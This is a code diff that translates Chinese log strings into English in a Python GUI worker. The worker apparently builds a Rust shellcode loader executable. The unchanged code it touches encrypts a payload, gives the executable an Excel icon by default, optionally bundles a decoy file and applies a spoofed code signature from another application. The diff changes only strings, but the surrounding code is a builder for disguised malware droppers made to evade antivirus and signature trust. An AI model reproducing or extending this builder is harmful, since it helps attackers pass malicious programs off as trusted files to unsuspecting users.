@@ -35,14 +35,14 @@ class WorkerThread(QThread):
             if self.params['sign_enable']:
                 self._sign_executable(output_file)
             self.progress_signal.emit(100)
-            self.log_signal.emit('全部完成！')
+            self.log_signal.emit('All done!')
             self.done_signal.emit(output_file)
         except Exception as e:
             self.error_signal.emit(str(e))
 
     def _encrypt_payload(self):
         self.progress_signal.emit(0)
-        self.log_signal.emit('加密中...')
+        self.log_signal.emit('Encrypting...')
         self.progress_signal.emit(10)
         
         enc_map = get_encryption_map()
@@ -67,15 +67,15 @@ class WorkerThread(QThread):
         self.progress_signal.emit(40)
 
     def _build_rust_project(self):
-        self.log_signal.emit('Rust 构建中...')
+        self.log_signal.emit('Building Rust project...')
         
         self.target = self.params.get('target', 'x86_64-pc-windows-msvc')
         
         features = self._build_features_list()
         features_str = ','.join(features)
         
-        self.log_signal.emit(f'本次编译启用 features: {features_str}')
-        self.log_signal.emit(f'编译目标: {self.target}')
+        self.log_signal.emit(f'Features enabled for this build: {features_str}')
+        self.log_signal.emit(f'Build target: {self.target}')
         
         manifest = load_plugins_manifest()
         run_modes = manifest['run_modes']
@@ -94,16 +94,15 @@ class WorkerThread(QThread):
         
         env_vars['RSL_ICON_PATH'] = self.params.get('icon_path', 'icons/excel.ico')
         
-        # 如果选择分离式加载，设置默认payload地址
         if self.params.get('load_payload_mode') == 'cmdline':
-            default_address = self.params.get('default_payload_address', 'payload.bin')
-            if default_address.strip():  # 确保不为空
+            default_address = self.params.get('default_payload_address', 'encrypt.bin')
+            if default_address.strip():  # Ensure not empty
                 env_vars['RSL_DEFAULT_PAYLOAD_ADDRESS'] = default_address
         
         if self.params.get('forgery_enable'):
             bundle_file = self.params.get('bundle_file', '')
             if not bundle_file:
-                raise ValueError('文件捆绑已启用，但未选择要捆绑的文件！')
+                raise ValueError('File bundling is enabled, but no bundle file was selected!')
             env_vars['RSL_BUNDLE_FILE'] = bundle_file
             env_vars['RSL_BUNDLE_FILENAME'] = os.path.basename(bundle_file)
         
@@ -180,7 +179,7 @@ class WorkerThread(QThread):
         return features
 
     def _copy_output(self):
-        self.log_signal.emit('复制输出...')
+        self.log_signal.emit('Copying output...')
         
         src_file = os.path.join('target', self.target, 'release', 'rsl.exe')
         out_dir = 'output'
@@ -197,14 +196,14 @@ class WorkerThread(QThread):
             raise FileNotFoundError(src_file)
         
         shutil.copyfile(src_file, dst_file)
-        self.log_signal.emit(f'已复制并重命名: {dst_file}')
+        self.log_signal.emit(f'Copied and renamed: {dst_file}')
         
         return dst_file
 
     def _sign_executable(self, dst_file):
         app_path = self.params['sign_app']
         if not app_path:
-            raise ValueError('未选择被伪造应用的路径！')
+            raise ValueError('No path selected for the spoofed application!')
         
         sign_out_file = dst_file[:-4] + '_signed.exe'
         sign_cmd = [
@@ -221,4 +220,4 @@ class WorkerThread(QThread):
             self.log_signal.emit(result.stderr)
         
         shutil.move(sign_out_file, dst_file)
-        self.log_signal.emit(f'伪造签名完成: {dst_file}')
+        self.log_signal.emit(f'Spoofed signature completed: {dst_file}')
